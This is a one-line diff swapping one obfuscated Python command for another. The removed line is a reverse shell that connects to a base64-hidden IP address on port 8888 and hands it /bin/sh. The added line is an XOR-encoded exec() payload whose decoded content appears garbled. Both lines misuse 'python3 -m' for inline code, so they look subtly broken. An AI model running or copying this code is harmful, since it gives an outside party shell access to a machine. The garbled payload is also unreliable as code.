@@ -1,1 +1,1 @@
-python3 -m "a=__import__;b=a('os');c=a('socket');d=c.socket();d.connect((a('base64').b64decode('NDMuMTU5LjQ0LjI1').decode(),8888));[b.dup2(d.fileno(),i)for i in[0,1,2]];b.system(a('base64').b64decode('L2Jpbi9zaA==').decode())"
+python3 -m "exec("".join(map(lambda x:chr(x^65),[13,4,16,21,10,3,17,21,10,2,17,10,3,21,14,1,13,4,20,10,1,14,4,10,17,21,10,1,14,4,10,1,17,10,1,14,4,10,1,17,10,1,14,4,10,1,17,10,1,14,4,10,1,17,10,1,14,4,10,1,17,10,1,14,4,10,1,17,10,1,14,4,10,1,17,10,1,14,4,10,1,17])))"
